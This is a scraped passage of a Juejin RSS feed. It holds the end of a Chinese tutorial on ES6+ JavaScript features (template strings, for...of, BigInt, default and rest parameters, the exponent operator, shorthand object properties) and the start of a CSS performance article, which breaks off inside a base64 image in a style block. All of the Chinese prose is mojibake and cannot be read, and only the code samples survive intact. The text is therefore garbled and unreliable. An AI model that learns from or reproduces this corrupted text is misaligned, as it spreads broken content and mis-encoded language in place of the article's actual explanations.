<span class="hljs-comment">// æ¨¡æ¿å­—ç¬¦ä¸²</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`hello, i am <span class="hljs-subst">${myName}</span>`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`hello, i am <span class="hljs-subst">${myName.toUpperCase()}</span>`</span>);

<span class="hljs-comment">// å¤šè¡Œå­—ç¬¦ä¸²</span>
<span class="hljs-keyword">const</span> message = <span class="hljs-string">`
  äº²çˆ±çš„ <span class="hljs-subst">${myName}</span>:
  æ¬¢è¿ä½¿ç”¨æˆ‘ä»¬çš„æœåŠ¡ï¼
  ç¥æ‚¨ä½¿ç”¨æ„‰å¿«ï¼
`</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(message);
</code></pre>
<h2 data-id="heading-5">æ›´ç°ä»£çš„å¾ªç¯ï¼šfor...of</h2>
<p><code>for...of</code> å¾ªç¯æä¾›äº†æ›´å¥½çš„å¯è¯»æ€§å’Œæ€§èƒ½ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> myName = <span class="hljs-string">'zhangsan'</span>;

<span class="hljs-comment">// for...of éå†å­—ç¬¦ä¸²</span>
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> x <span class="hljs-keyword">of</span> myName) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(x); <span class="hljs-comment">// ä¾æ¬¡è¾“å‡º: z h a n g s a n</span>
}

<span class="hljs-comment">// ä¸ for å¾ªç¯å¯¹æ¯”</span>
<span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];

<span class="hljs-comment">// ä¼ ç»Ÿçš„ for å¾ªç¯</span>
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; arr.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr[i]);
}

<span class="hljs-comment">// æ›´ç®€æ´çš„ for...of</span>
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> item <span class="hljs-keyword">of</span> arr) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(item);
}
</code></pre>
<blockquote>
<p><strong>æ€§èƒ½å»ºè®®</strong>ï¼š<code>for...of</code> è¯­ä¹‰æ›´å¥½ï¼Œå¯è¯»æ€§æ›´å¼ºï¼Œæ€§èƒ½ä¹Ÿä¸ä¼šæ¯”è®¡æ•°å¾ªç¯å·®å¤ªå¤šã€‚è€Œ <code>for...in</code> æ€§èƒ½è¾ƒå·®ï¼Œåº”å°½é‡é¿å…ä½¿ç”¨ã€‚</p>
</blockquote>
<h2 data-id="heading-6">BigIntï¼šå¤„ç†å¤§æ•´æ•°çš„æ–°æ•°æ®ç±»å‹</h2>
<p>JavaScript çš„æ•°å­—ç±»å‹æœ‰ç²¾åº¦é™åˆ¶ï¼Œæœ€å¤§å®‰å…¨æ•´æ•°æ˜¯ 2^53-1ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// JavaScript çš„æ•°å­—ç²¾åº¦é—®é¢˜</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Number</span>.<span class="hljs-property">MAX_SAFE_INTEGER</span>); <span class="hljs-comment">// 9007199254740991</span>

<span class="hljs-keyword">let</span> num = <span class="hljs-number">1234567890987654321</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num); <span class="hljs-comment">// 1234567890987654400ï¼ˆç²¾åº¦ä¸¢å¤±ï¼ï¼‰</span>

<span class="hljs-comment">// ä½¿ç”¨ BigInt</span>
<span class="hljs-keyword">let</span> num2 = <span class="hljs-number">1234567890987654321n</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(num2, <span class="hljs-keyword">typeof</span> num2); <span class="hljs-comment">// 1234567890987654321n 'bigint'</span>

<span class="hljs-comment">// BigInt è¿ç®—</span>
<span class="hljs-keyword">const</span> big1 = <span class="hljs-number">9007199254740991n</span>;
<span class="hljs-keyword">const</span> big2 = <span class="hljs-number">1n</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(big1 + big2); <span class="hljs-comment">// 9007199254740992n</span>

<span class="hljs-comment">// æ³¨æ„äº‹é¡¹</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1n</span> + <span class="hljs-number">2</span>); <span class="hljs-comment">// âŒ TypeError: Cannot mix BigInt and other types</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(<span class="hljs-number">16n</span>)); <span class="hljs-comment">// âŒ TypeError</span>
<span class="hljs-keyword">const</span> x = <span class="hljs-number">3.</span><span class="hljs-number">14n</span>; <span class="hljs-comment">// âŒ SyntaxError: Invalid or unexpected token</span>
</code></pre>
<h3 data-id="heading-7">BigInt ä½¿ç”¨è¦ç‚¹ï¼š</h3>
<ul>
<li>ä½¿ç”¨ <code>n</code> åç¼€è¡¨ç¤º BigInt å­—é¢é‡</li>
<li>ä¸èƒ½ä¸ Number ç±»å‹ç›´æ¥æ··åˆè¿ç®—</li>
<li>ä¸èƒ½ä½¿ç”¨ Math å¯¹è±¡çš„æ–¹æ³•</li>
<li>åªèƒ½è¡¨ç¤ºæ•´æ•°ï¼Œä¸æ”¯æŒå°æ•°</li>
</ul>
<h2 data-id="heading-8">å‡½æ•°å‚æ•°çš„å¢å¼º</h2>
<h3 data-id="heading-9">é»˜è®¤å‚æ•°</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">x = <span class="hljs-number">1</span>, y = <span class="hljs-number">1</span></span>) {
    <span class="hljs-keyword">return</span> x + y;
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">foo</span>(<span class="hljs-number">3</span>)); <span class="hljs-comment">// 4 (ä½¿ç”¨é»˜è®¤å€¼ y=1)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">foo</span>(<span class="hljs-number">3</span>, <span class="hljs-number">5</span>)); <span class="hljs-comment">// 8</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">foo</span>()); <span class="hljs-comment">// 2 (ä½¿ç”¨é»˜è®¤å€¼ x=1, y=1)</span>
</code></pre>
<h3 data-id="heading-10">å‰©ä½™å‚æ•° vs arguments</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">...args</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å‰©ä½™å‚æ•°:'</span>, args, <span class="hljs-keyword">typeof</span> args); 
    <span class="hljs-comment">// [1, 2, 3, 4] 'object'</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ˜¯æ•°ç»„å—:'</span>, <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(args)); <span class="hljs-comment">// true</span>
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'arguments:'</span>, <span class="hljs-variable language_">arguments</span>, <span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">arguments</span>); 
    <span class="hljs-comment">// [Arguments] { '0': 1, '1': 2, '2': 3, '3': 4 } 'object'</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'argumentsæ˜¯æ•°ç»„å—:'</span>, <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(<span class="hljs-variable language_">arguments</span>)); <span class="hljs-comment">// false</span>
    
    <span class="hljs-comment">// å‰©ä½™å‚æ•°æ”¯æŒæ•°ç»„æ–¹æ³•</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å‚æ•°ä¸ªæ•°:'</span>, args.<span class="hljs-property">length</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å‚æ•°æ€»å’Œ:'</span>, args.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">a, b</span>) =&gt;</span> a + b, <span class="hljs-number">0</span>));
}

<span class="hljs-title function_">foo</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>);
</code></pre>
<h3 data-id="heading-11">å‰©ä½™å‚æ•°çš„ä¼˜åŠ¿ï¼š</h3>
<ul>
<li>æ˜¯çœŸæ­£çš„æ•°ç»„ï¼Œå¯ä»¥ä½¿ç”¨æ‰€æœ‰æ•°ç»„æ–¹æ³•</li>
<li>æ›´æ¸…æ™°çš„è¯­æ³•</li>
<li>æ›´å¥½çš„ç±»å‹æ¨æ–­ï¼ˆTypeScriptï¼‰</li>
</ul>
<h2 data-id="heading-12">å…¶ä»–å®ç”¨ç‰¹æ€§</h2>
<h3 data-id="heading-13">æŒ‡æ•°è¿ç®—ç¬¦</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ES7 (2016) å¼•å…¥çš„æŒ‡æ•°è¿ç®—ç¬¦</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">2</span> ** <span class="hljs-number">10</span>); <span class="hljs-comment">// 1024</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">3</span> ** <span class="hljs-number">3</span>); <span class="hljs-comment">// 27</span>

<span class="hljs-comment">// æ›¿ä»£ Math.pow()</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">10</span>)); <span class="hljs-comment">// 1024 (ä¼ ç»Ÿæ–¹å¼)</span>
</code></pre>
<h3 data-id="heading-14">å¯¹è±¡å±æ€§ç®€å†™</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> name = <span class="hljs-string">'Alice'</span>;
<span class="hljs-keyword">const</span> age = <span class="hljs-number">25</span>;

<span class="hljs-comment">// ä¼ ç»Ÿå†™æ³•</span>
<span class="hljs-keyword">const</span> obj1 = {
    <span class="hljs-attr">name</span>: name,
    <span class="hljs-attr">age</span>: age
};

<span class="hljs-comment">// ES6 ç®€å†™å†™æ³•</span>
<span class="hljs-keyword">const</span> obj2 = {
    name,
    age
};

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj2); <span class="hljs-comment">// { name: 'Alice', age: 25 }</span>
</code></pre>
<h2 data-id="heading-15">æ€»ç»“</h2>
<p>ES6+ çš„æ–°ç‰¹æ€§è®© JavaScript å¼€å‘å˜å¾—æ›´åŠ ä¼˜é›…å’Œé«˜æ•ˆï¼š</p>
<ul>
<li><strong>è§£æ„èµ‹å€¼</strong> è®©æ•°æ®æå–æ›´ç›´è§‚</li>
<li><strong>æ¨¡æ¿å­—ç¬¦ä¸²</strong> è®©å­—ç¬¦ä¸²å¤„ç†æ›´ç®€æ´</li>
<li><strong>for...of</strong> æä¾›æ›´å¥½çš„å¾ªç¯ä½“éªŒ</li>
<li><strong>BigInt</strong> è§£å†³å¤§æ•´æ•°è®¡ç®—é—®é¢˜</li>
<li><strong>å‡½æ•°å‚æ•°å¢å¼º</strong> æä¾›æ›´çµæ´»çš„å‡½æ•°è®¾è®¡</li>
</ul>
<p>è¿™äº›ç‰¹æ€§ä¸ä»…æé«˜äº†å¼€å‘æ•ˆç‡ï¼Œä¹Ÿè®©ä»£ç æ›´æ˜“è¯»ã€æ˜“ç»´æŠ¤ã€‚å»ºè®®åœ¨å®é™…é¡¹ç›®ä¸­ç§¯æé‡‡ç”¨è¿™äº›ç°ä»£ JavaScript ç‰¹æ€§ï¼Œæå‡ä»£ç è´¨é‡ã€‚</p>
<blockquote>
<p><strong>å­¦ä¹ å»ºè®®</strong>ï¼šä»è§£æ„èµ‹å€¼å’Œæ¨¡æ¿å­—ç¬¦ä¸²å¼€å§‹ï¼Œé€æ­¥æŒæ¡å…¶ä»–ç‰¹æ€§ï¼Œè®© ES6+ æˆä¸ºä½ çš„å¼€å‘åˆ©å™¨ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯æ€§èƒ½ä¼˜åŒ–ä¹‹CSSç¯‡]]></title>    <link>https://juejin.cn/post/7575655132755591187</link>    <guid>https://juejin.cn/post/7575655132755591187</guid>    <pubDate>2025-11-23T13:03:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575655132755591187" data-draft-id="7575442779039350826" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯æ€§èƒ½ä¼˜åŒ–ä¹‹CSSç¯‡"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2025-11-23T13:03:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜å°å¯’"/> <meta itemprop="url" content="https://juejin.cn/user/694547078987287"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯æ€§èƒ½ä¼˜åŒ–ä¹‹CSSç¯‡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/694547078987287/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜å°å¯’
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T13:03:58.000Z" title="Sun Nov 23 2025 13:03:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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